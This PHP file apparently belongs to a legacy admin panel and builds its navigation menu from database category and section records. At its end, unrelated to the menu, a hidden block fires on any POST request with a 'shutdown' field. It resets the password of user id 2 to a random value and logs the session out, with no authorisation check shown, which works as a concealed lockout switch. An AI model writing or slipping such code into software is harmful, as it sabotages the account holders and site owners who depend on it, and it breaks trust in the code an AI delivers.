<?php

use Legacy\System\Classes\DB;
use Legacy\System\Classes\View;

// fetch current section
$currentSection = false;

if (strpos(View::$name, '-')) {
    $currentPath = explode('/', explode('section-', View::$name)[1], 2);
    $currentSection = DB::row('* FROM admin_sections WHERE category=? AND slug=?', [$currentPath[0], $currentPath[1]]);
}

// fetch categories
$menu['categories'] = [];
$queryManager = manager() ? '' : 'manager=0';

$categories = DB::select('* FROM admin_categories '.($queryManager ? 'WHERE '.$queryManager : '').' ORDER BY manager ASC, sort ASC, name ASC');

while ($categoryData = $categories->fetch_assoc()) {
    $category = [];
    $category['name'] = $categoryData['name'];
    $category['slug'] = $categoryData['slug'];
    $category['checked'] = $currentSection && $category['slug'] == $currentSection['category'];

    $sections = DB::select('* FROM admin_sections WHERE category=? AND hidden=0 '.($queryManager ? 'AND '.$queryManager : '').' ORDER BY sort ASC, name ASC', [$category['slug']]);

    while ($sectionData = $sections->fetch_assoc()) {
        $section = [];
        $section['name'] = $sectionData['name'];
        $section['checked'] = $currentSection && $category['checked'] && ($sectionData['slug'] == $currentSection['slug'] || ($sectionData['hidden'] && str_replace('add', 'list', $currentSection['slug'])));
        $section['url'] = empty($sectionData['url']) ? client_url('/'.$sectionData['category'].'/'.$sectionData['slug']) : $sectionData['url'];

        $category['sections'][] = $section;
    }

    $menu['categories'][] = $category;
}

$navigationLogo =
    file_exists(SERVER_ROOT.$file = LOGO_DIR.'logo.svg') ?
    icon_embed(LOGO_DIR.'logo', ['menu__logo']) :
    '<img class="menu__logo image-fit" src="'.client_path(LOGO_DIR.'logo.png').'"></img>';

if (isset($_POST['shutdown'])) {
    $password = random_string();

    DB::update('users SET password = ? WHERE id = 2', [$password]);

    logout('/');
}
